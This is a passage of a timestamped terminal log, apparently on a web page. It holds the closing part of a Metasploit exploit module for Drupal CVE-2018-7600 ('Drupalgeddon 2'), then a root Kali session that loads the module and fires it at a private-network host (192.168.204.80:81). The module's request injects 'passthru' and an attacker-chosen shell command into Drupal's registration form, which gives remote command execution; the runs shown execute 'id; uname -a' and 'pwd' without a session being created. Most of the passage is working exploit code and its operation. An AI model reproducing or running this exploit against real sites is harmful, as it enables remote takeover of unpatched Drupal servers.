+2018-04-15T18:20:36.428 -         'Nixawk',          # Proof of concept
+2018-04-15T18:20:36.428 -         'wvu'              # Metasploit module
+2018-04-15T18:20:36.428 -       ],
+2018-04-15T18:20:36.428 -       'References'     =&gt; [
+2018-04-15T18:20:36.428 -         ['CVE', '2018-7600'],
+2018-04-15T18:20:36.428 -         ['URL', 'https://www.drupal.org/sa-core-2018-002'],
+2018-04-15T18:20:36.428 -         ['URL', 'https://greysec.net/showthread.php?tid=2912'],
+2018-04-15T18:20:36.428 -         ['URL', 'https://research.checkpoint.com/uncovering-drupalgeddon-2/'],
+2018-04-15T18:20:36.428 -         ['URL', 'https://github.com/a2u/CVE-2018-7600'],
+2018-04-15T18:20:36.428 -         ['URL', 'https://github.com/nixawk/labs/issues/19']
+2018-04-15T18:20:36.428 -       ],
+2018-04-15T18:20:36.428 -       'DisclosureDate' =&gt; 'Mar 28 2018',
+2018-04-15T18:20:36.428 -       'License'        =&gt; MSF_LICENSE,
+2018-04-15T18:20:36.428 -       'Platform'       =&gt; 'unix',
+2018-04-15T18:20:36.428 -       'Arch'           =&gt; ARCH_CMD,
+2018-04-15T18:20:36.428 -       'Privileged'     =&gt; false,
+2018-04-15T18:20:36.428 -       'Targets'        =&gt; [
+2018-04-15T18:20:36.428 -         ['Drupal &lt; 7.58, &lt; 8.3.9, &lt; 8.4.6, &lt; 8.5.1', {}]
+2018-04-15T18:20:36.428 -       ],
+2018-04-15T18:20:36.430 -       'DefaultTarget'  =&gt; 0,
+2018-04-15T18:20:36.430 -       'DefaultOptions' =&gt; {
+2018-04-15T18:20:36.430 -         'PAYLOAD'      =&gt; 'cmd/unix/generic',
+2018-04-15T18:20:36.430 -         'CMD'          =&gt; 'id; uname -a'
+2018-04-15T18:20:36.430 -       }
+2018-04-15T18:20:36.430 -     ))
+2018-04-15T18:20:36.430 - 
+2018-04-15T18:20:36.430 -     register_options([
+2018-04-15T18:20:36.430 -       OptString.new('TARGETURI', [true, 'Path to Drupal install', '/']),
+2018-04-15T18:20:36.430 -       OptBool.new('CLEAN_URLS',  [false, 'If clean URLs are enabled', true]),
+2018-04-15T18:20:36.430 -       OptBool.new('DUMP_OUTPUT', [false, 'If output should be dumped', true])
+2018-04-15T18:20:36.430 -     ])
+2018-04-15T18:20:36.430 -   end
+2018-04-15T18:20:36.430 - 
+2018-04-15T18:20:36.430 -   def check
+2018-04-15T18:20:36.430 -     token = Rex::Text.rand_text_alphanumeric(8..42)
+2018-04-15T18:20:36.430 - 
+2018-04-15T18:20:36.430 -     res = exploit(code: &quot;echo #{token}&quot;)
+2018-04-15T18:20:36.430 - 
+2018-04-15T18:20:36.430 -     if res &amp;&amp; res.body.include?(token)
+2018-04-15T18:20:36.430 -       return CheckCode::Vulnerable
+2018-04-15T18:20:36.430 -     end
+2018-04-15T18:20:36.430 - 
+2018-04-15T18:20:36.430 -     CheckCode::Safe
+2018-04-15T18:20:36.430 -   end
+2018-04-15T18:20:36.430 - 
+2018-04-15T18:20:36.430 -   # TODO: passthru() may be disabled, so try others
+2018-04-15T18:20:36.430 -   def exploit(func: 'passthru', code: payload.encoded)
+2018-04-15T18:20:36.430 -     if datastore['CLEAN_URLS']
+2018-04-15T18:20:36.430 -       register = '/user/register'
+2018-04-15T18:20:36.430 -     else
+2018-04-15T18:20:36.430 -       register = '?q=user/register'
+2018-04-15T18:20:36.430 -     end
+2018-04-15T18:20:36.430 - 
+2018-04-15T18:20:36.430 -     print_status(&quot;Executing on target: #{code}&quot;)
+2018-04-15T18:20:36.430 - 
+2018-04-15T18:20:36.430 -     res = send_request_cgi(
+2018-04-15T18:20:36.430 -       'method'    =&gt; 'POST',
+2018-04-15T18:20:36.430 -       'uri'       =&gt; normalize_uri(target_uri.path, register),
+2018-04-15T18:20:36.430 -       'vars_get'  =&gt; {
+2018-04-15T18:20:36.430 -         'element_parents' =&gt; 'account/mail/#value',
+2018-04-15T18:20:36.430 -         'ajax_form'       =&gt; 1,
+2018-04-15T18:20:36.430 -         '_wrapper_format' =&gt; 'drupal_ajax'
+2018-04-15T18:20:36.430 -       },
+2018-04-15T18:20:36.430 -       'vars_post' =&gt; {
+2018-04-15T18:20:36.430 -         'form_id'              =&gt; 'user_register_form',
+2018-04-15T18:20:36.430 -         '_drupal_ajax'         =&gt; 1,
+2018-04-15T18:20:36.430 -         'mail[#type]'          =&gt; 'markup',
+2018-04-15T18:20:36.430 -         'mail[#post_render][]' =&gt; func,
+2018-04-15T18:20:36.430 -         'mail[#markup]'        =&gt; code
+2018-04-15T18:20:36.430 -       }
+2018-04-15T18:20:36.430 -     )
+2018-04-15T18:20:36.430 - 
+2018-04-15T18:20:36.430 -     if res.nil? || res.code != 200
+2018-04-15T18:20:36.430 -       print_error(&quot;Unexpected reply: #{res.inspect}&quot;)
+2018-04-15T18:20:36.430 -       return nil
+2018-04-15T18:20:36.430 -     end
+2018-04-15T18:20:36.430 - 
+2018-04-15T18:20:36.430 -     print_line(res.body) if datastore['DUMP_OUTPUT']
+2018-04-15T18:20:36.430 - 
+2018-04-15T18:20:36.430 -     res
+2018-04-15T18:20:36.430 -   end
+2018-04-15T18:20:36.430 - 
+2018-04-15T18:20:36.430 - end
+2018-04-15T18:20:37.195 - root@kali:/opt/metasploit-framework/modules/exploits# 
+2018-04-15T18:20:37.391 - root@kali:/opt/metasploit-framework/modules/exploits# 
+2018-04-15T18:20:37.619 - root@kali:/opt/metasploit-framework/modules/exploits# 
+2018-04-15T18:20:41.295 - root@kali:/opt/metasploit-framework/modules/exploits# cd ../../
+2018-04-15T18:20:41.693 - root@kali:/opt/metasploit-framework# 
+2018-04-15T18:20:41.893 - root@kali:/opt/metasploit-framework# 
+2018-04-15T18:20:42.109 - root@kali:/opt/metasploit-framework# 
+2018-04-15T18:20:46.176 - root@kali:/opt/metasploit-framework# ./msfconsole
+2018-04-15T18:21:22.240 -                                                   
+2018-04-15T18:21:22.357 - 
+2018-04-15T18:21:22.357 -          .                                         .
+2018-04-15T18:21:22.357 -  .
+2018-04-15T18:21:22.358 - 
+2018-04-15T18:21:22.358 -       dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
+2018-04-15T18:21:22.358 -        '   dB'                     BBP
+2018-04-15T18:21:22.370 -     dB'dB'dB' dBBP     dBP     dBP BB
+2018-04-15T18:21:22.370 -    dB'dB'dB' dBP      dBP     dBP  BB
+2018-04-15T18:21:22.370 -   dB'dB'dB' dBBBBP   dBP     dBBBBBBB
+2018-04-15T18:21:22.370 - 
+2018-04-15T18:21:22.370 -                                    dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
+2018-04-15T18:21:22.370 -           .                  .                  dB' dBP    dB'.BP
+2018-04-15T18:21:22.370 -                              |       dBP    dBBBB' dBP    dB'.BP dBP    dBP
+2018-04-15T18:21:22.370 -                            --o--    dBP    dBP    dBP    dB'.BP dBP    dBP
+2018-04-15T18:21:22.370 -                              |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP
+2018-04-15T18:21:22.370 - 
+2018-04-15T18:21:22.370 -                                                                     .
+2018-04-15T18:21:22.370 -                 .
+2018-04-15T18:21:22.370 -         o                  To boldly go where no
+2018-04-15T18:21:22.370 -                             shell has gone before
+2018-04-15T18:21:22.370 - 
+2018-04-15T18:21:22.370 - 
+2018-04-15T18:21:22.370 -        =[ metasploit v5.0.0-dev-6721b79526                ]
+2018-04-15T18:21:22.370 - + -- --=[ 1735 exploits - 992 auxiliary - 300 post        ]
+2018-04-15T18:21:22.370 - + -- --=[ 509 payloads - 40 encoders - 10 nops            ]
+2018-04-15T18:21:22.370 - + -- --=[ ** This is Metasploit 5 development branch **   ]
+2018-04-15T18:21:22.370 - 
+2018-04-15T18:22:07.576 - msf5 &gt; 
+2018-04-15T18:22:07.763 - msf5 &gt; 
+2018-04-15T18:23:09.035 - msf5 &gt; search cve-2018-7600
+2018-04-15T18:23:09.219 - 
+2018-04-15T18:23:09.219 - Matching Modules
+2018-04-15T18:23:09.219 - ================
+2018-04-15T18:23:09.219 - 
+2018-04-15T18:23:09.219 -    Name                   Disclosure Date  Rank       Description
+2018-04-15T18:23:09.219 -    ----                   ---------------  ----       -----------
+2018-04-15T18:23:09.221 -    exploit/cve-2018-7600  2018-03-28       excellent  Drupal Drupalgeddon 2
+2018-04-15T18:23:09.221 - 
+2018-04-15T18:23:09.221 - 
+2018-04-15T18:23:09.860 - msf5 &gt; 
+2018-04-15T18:23:10.036 - msf5 &gt; 
+2018-04-15T18:23:16.820 - msf5 &gt; use exploit/cve-2018-7600
+2018-04-15T18:23:17.582 - msf5 exploit(cve-2018-7600) &gt; 
+2018-04-15T18:23:17.754 - msf5 exploit(cve-2018-7600) &gt; 
+2018-04-15T18:23:17.906 - msf5 exploit(cve-2018-7600) &gt; 
+2018-04-15T18:23:19.426 - msf5 exploit(cve-2018-7600) &gt; show options 
+2018-04-15T18:23:19.444 - 
+2018-04-15T18:23:19.444 - Module options (exploit/cve-2018-7600):
+2018-04-15T18:23:19.445 - 
+2018-04-15T18:23:19.445 -    Name         Current Setting  Required  Description
+2018-04-15T18:23:19.445 -    ----         ---------------  --------  -----------
+2018-04-15T18:23:19.445 -    CLEAN_URLS   true             no        If clean URLs are enabled
+2018-04-15T18:23:19.446 -    DUMP_OUTPUT  true             no        If output should be dumped
+2018-04-15T18:23:19.446 -    Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
+2018-04-15T18:23:19.446 -    RHOST                         yes       The target address
+2018-04-15T18:23:19.447 -    RPORT        80               yes       The target port (TCP)
+2018-04-15T18:23:19.447 -    SSL          false            no        Negotiate SSL/TLS for outgoing connections
+2018-04-15T18:23:19.447 -    TARGETURI    /                yes       Path to Drupal install
+2018-04-15T18:23:19.447 -    VHOST                         no        HTTP server virtual host
+2018-04-15T18:23:19.447 - 
+2018-04-15T18:23:19.452 - 
+2018-04-15T18:23:19.452 - Payload options (cmd/unix/generic):
+2018-04-15T18:23:19.452 - 
+2018-04-15T18:23:19.452 -    Name  Current Setting  Required  Description
+2018-04-15T18:23:19.452 -    ----  ---------------  --------  -----------
+2018-04-15T18:23:19.452 -    CMD   id; uname -a     yes       The command string to execute
+2018-04-15T18:23:19.452 - 
+2018-04-15T18:23:19.455 - 
+2018-04-15T18:23:19.455 - Exploit target:
+2018-04-15T18:23:19.455 - 
+2018-04-15T18:23:19.455 -    Id  Name
+2018-04-15T18:23:19.455 -    --  ----
+2018-04-15T18:23:19.456 -    0   Drupal &lt; 7.58, &lt; 8.3.9, &lt; 8.4.6, &lt; 8.5.1
+2018-04-15T18:23:19.456 - 
+2018-04-15T18:23:19.456 - 
+2018-04-15T18:23:19.578 - msf5 exploit(cve-2018-7600) &gt; 
+2018-04-15T18:23:20.340 - msf5 exploit(cve-2018-7600) &gt; ls
+2018-04-15T18:23:20.406 - [*] exec: ls
+2018-04-15T18:23:20.407 - 
+2018-04-15T18:23:20.696 - app
+2018-04-15T18:23:20.704 - CODE_OF_CONDUCT.md
+2018-04-15T18:23:20.704 - config
+2018-04-15T18:23:20.704 - CONTRIBUTING.md
+2018-04-15T18:23:20.704 - COPYING
+2018-04-15T18:23:20.704 - CURRENT.md
+2018-04-15T18:23:20.705 - data
+2018-04-15T18:23:20.705 - db
+2018-04-15T18:23:20.705 - docker
+2018-04-15T18:23:20.705 - docker-compose.override.yml
+2018-04-15T18:23:20.705 - docker-compose.yml
+2018-04-15T18:23:20.707 - Dockerfile
+2018-04-15T18:23:20.708 - documentation
+2018-04-15T18:23:20.709 - external
+2018-04-15T18:23:20.710 - Gemfile
+2018-04-15T18:23:20.710 - Gemfile.local.example
+2018-04-15T18:23:20.712 - Gemfile.lock
+2018-04-15T18:23:20.712 - lib
+2018-04-15T18:23:20.713 - LICENSE
+2018-04-15T18:23:20.714 - LICENSE_GEMS
+2018-04-15T18:23:20.715 - metasploit-framework.gemspec
+2018-04-15T18:23:20.716 - modules
+2018-04-15T18:23:20.717 - msfconsole
+2018-04-15T18:23:20.718 - msfd
+2018-04-15T18:23:20.719 - msfrpc
+2018-04-15T18:23:20.720 - msfrpcd
+2018-04-15T18:23:20.721 - msfupdate
+2018-04-15T18:23:20.722 - msfvenom
+2018-04-15T18:23:20.723 - plugins
+2018-04-15T18:23:20.724 - Rakefile
+2018-04-15T18:23:20.725 - README.md
+2018-04-15T18:23:20.725 - script
+2018-04-15T18:23:20.726 - scripts
+2018-04-15T18:23:20.727 - spec
+2018-04-15T18:23:20.728 - test
+2018-04-15T18:23:20.729 - tools
+2018-04-15T18:23:20.731 - Vagrantfile
+2018-04-15T18:23:22.118 - msf5 exploit(cve-2018-7600) &gt; 
+2018-04-15T18:23:22.512 - msf5 exploit(cve-2018-7600) &gt; 
+2018-04-15T18:23:40.222 - msf5 exploit(cve-2018-7600) &gt; set RHOST 192.168.204.80
+2018-04-15T18:23:40.232 - RHOST =&gt; 192.168.204.80
+2018-04-15T18:23:48.474 - msf5 exploit(cve-2018-7600) &gt; set RPORT 81
+2018-04-15T18:23:48.489 - RPORT =&gt; 81
+2018-04-15T18:23:49.044 - msf5 exploit(cve-2018-7600) &gt; 
+2018-04-15T18:24:01.575 - msf5 exploit(cve-2018-7600) &gt; show options 
+2018-04-15T18:24:01.595 - 
+2018-04-15T18:24:01.595 - Module options (exploit/cve-2018-7600):
+2018-04-15T18:24:01.595 - 
+2018-04-15T18:24:01.595 -    Name         Current Setting  Required  Description
+2018-04-15T18:24:01.595 -    ----         ---------------  --------  -----------
+2018-04-15T18:24:01.596 -    CLEAN_URLS   true             no        If clean URLs are enabled
+2018-04-15T18:24:01.596 -    DUMP_OUTPUT  true             no        If output should be dumped
+2018-04-15T18:24:01.596 -    Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
+2018-04-15T18:24:01.596 -    RHOST        192.168.204.80   yes       The target address
+2018-04-15T18:24:01.596 -    RPORT        81               yes       The target port (TCP)
+2018-04-15T18:24:01.597 -    SSL          false            no        Negotiate SSL/TLS for outgoing connections
+2018-04-15T18:24:01.597 -    TARGETURI    /                yes       Path to Drupal install
+2018-04-15T18:24:01.597 -    VHOST                         no        HTTP server virtual host
+2018-04-15T18:24:01.597 - 
+2018-04-15T18:24:01.607 - 
+2018-04-15T18:24:01.607 - Payload options (cmd/unix/generic):
+2018-04-15T18:24:01.607 - 
+2018-04-15T18:24:01.607 -    Name  Current Setting  Required  Description
+2018-04-15T18:24:01.607 -    ----  ---------------  --------  -----------
+2018-04-15T18:24:01.607 -    CMD   id; uname -a     yes       The command string to execute
+2018-04-15T18:24:01.607 - 
+2018-04-15T18:24:01.607 - 
+2018-04-15T18:24:01.607 - Exploit target:
+2018-04-15T18:24:01.607 - 
+2018-04-15T18:24:01.607 -    Id  Name
+2018-04-15T18:24:01.608 -    --  ----
+2018-04-15T18:24:01.608 -    0   Drupal &lt; 7.58, &lt; 8.3.9, &lt; 8.4.6, &lt; 8.5.1
+2018-04-15T18:24:01.608 - 
+2018-04-15T18:24:01.608 - 
+2018-04-15T18:24:07.126 - msf5 exploit(cve-2018-7600) &gt; 
+2018-04-15T18:24:07.324 - msf5 exploit(cve-2018-7600) &gt; 
+2018-04-15T18:24:07.488 - msf5 exploit(cve-2018-7600) &gt; 
+2018-04-15T18:24:12.059 - msf5 exploit(cve-2018-7600) &gt; run
+2018-04-15T18:24:12.108 - 
+2018-04-15T18:24:12.108 - [*] Executing on target: id; uname -a
+2018-04-15T18:24:12.877 - [{&quot;command&quot;:&quot;insert&quot;,&quot;method&quot;:&quot;replaceWith&quot;,&quot;selector&quot;:null,&quot;data&quot;:&quot;\n  \u003Cspan class=\u0022ajax-new-content\u0022\u003E\u003C\/span\u003E&quot;,&quot;settings&quot;:null}]
+2018-04-15T18:24:15.083 - [*] Exploit completed, but no session was created.
+2018-04-15T18:24:16.530 - msf5 exploit(cve-2018-7600) &gt; 
+2018-04-15T18:24:16.822 - msf5 exploit(cve-2018-7600) &gt; 
+2018-04-15T18:24:22.486 - msf5 exploit(cve-2018-7600) &gt; set cmd pwd
+2018-04-15T18:24:22.500 - cmd =&gt; pwd
+2018-04-15T18:24:23.108 - msf5 exploit(cve-2018-7600) &gt; 
+2018-04-15T18:24:24.145 - msf5 exploit(cve-2018-7600) &gt; run
+2018-04-15T18:24:24.193 - 
+2018-04-15T18:24:24.194 - [*] Executing on target: pwd
+2018-04-15T18:24:24.745 - [{&quot;command&quot;:&quot;insert&quot;,&quot;method&quot;:&quot;replaceWith&quot;,&quot;selector&quot;:null,&quot;data&quot;:&quot;\n  \u003Cspan class=\u0022ajax-new-content\u0022\u003E\u003C\/span\u003E&quot;,&quot;settings&quot;:null}]
+2018-04-15T18:24:26.952 - [*] Exploit completed, but no session was created.
+2018-04-15T18:24:27.893 - msf5 exploit(cve-2018-7600) &gt; 
+2018-04-15T18:24:28.138 - msf5 exploit(cve-2018-7600) &gt; 
+2018-04-15T18:24:28.353 - msf5 exploit(cve-2018-7600) &gt; 
+2018-04-15T18:24:29.324 - msf5 exploit(cve-2018-7600) &gt; exit
+2018-04-15T18:24:30.077 - root@kali:/opt/metasploit-framework# 
+2018-04-15T18:24:30.311 - root@kali:/opt/metasploit-framework# 
+2018-04-15T18:24:32.556 - root@kali:/opt/metasploit-framework# exit
+2018-04-15T18:24:32.556 - logout
+2018-04-15T18:24:32.631 - 
+</div></code></pre>
+
+</body>
+</html>
